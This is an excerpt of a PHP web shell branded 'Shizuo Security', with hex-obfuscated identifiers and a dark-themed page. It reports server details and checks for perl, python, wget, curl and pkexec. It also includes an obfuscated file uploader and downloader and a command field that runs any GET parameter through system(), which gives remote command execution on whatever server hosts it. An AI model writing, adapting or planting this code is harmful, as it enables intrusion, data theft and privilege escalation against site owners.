...
define("Yp", " \x53\x48\x49\x5a\x55\x4f\x53\x45\x43\x20\x35\x48\x33\x31\x31 ");
$G3 = "s\x63\x61\x6e\x64\x69\x72";
...
<body style="background-color:#171717;color:#fff;font-family:serif;">
	<div class="table-responsive text-light border">
...
?>
			...
			<li>IP Server: <?= "{$_SERVER["SERVER_ADDR"]}"; ?></li>
			<li>PHP Version: <?= phpversion(); ?></li>
			<li>Perl: <?= (exec('perl -V')) ? "<font color=green>ON</font>" : "<font color=red>OFF</font>"; ?></li>
			<li>Python: <?= (exec('python3 -V')) ? "<font color=green>ON</font>" : "<font color=red>OFF</font>"; ?></li>
			<li>Wget: <?= (exec('wget -V')) ? "<font color=green>ON</font>" : "<font color=red>OFF</font>"; ?></li>
			<li>Curl: <?= (exec('curl -V')) ? "<font color=green>ON</font>" : "<font color=red>OFF</font>"; ?></li>
            		<li>Pkexec: <?= (exec('ls -la /usr/bin/pkexec')) ? "<font color=green>ON</font>" : "<font color=red>OFF</font>"; ?></li>
			<li>Disable Functions: <?= (!empty($ds)) ? "<font color=red>$ds</font>" : "<font color=green>All Functions Accessible</font>"; ?></li>
		</div>
		...
		<?php  if (!isset($_FILES["f"])) { goto ea; } $Wx = $_FILES["f"]["name"]; $lE = 0; th: if (!($lE < count($Wx))) { goto dx; } if ($c8[11]($_FILES["f"]["tmp_name"][$lE], $Wx[$lE])) { goto PG; } Xe("file failed to upload", 0); goto tG; PG: XE("file uploaded successfully"); tG: g9: $lE++; goto th; dx: ea: if (!isset($_GET["download"])) { goto FA; } header("Content-Type: application/octet-stream"); header("Content-Transfer-Encoding: Binary"); header("Content-Length: " . $c8[17](JD($_GET["n"]))); header("Content-disposition: attachment; filename=\"" . jd($_GET["n"]) . "\""); FA: ?>
				...
				<a href="?p=<?= Ss($Jd) . "&a=" . sS("newDir"); ?>"> [ Add New Directory ] </a></br>
				<form></br>
    <input class="form-control form-control-sm" type="text" name="cmd" placeholder="lewster7@localhost:~$ " />
    </form></br>
<font color="white" size="5">
<?php
    if(isset($_GET['cmd'])){
        echo "<textarea class='form-control' rows='20' readonly>";
        echo system($_GET['cmd']);
        echo "</textarea>";
    }
?>
			</div>
	<div class="border table-responsive mt-2">
	...
	<article class="border table-responsive mt-2">
	...
	<div class="border text-center mt-2">
		<small>Copyright &copy; 2022 || Shizuo Security</small>
	</div>
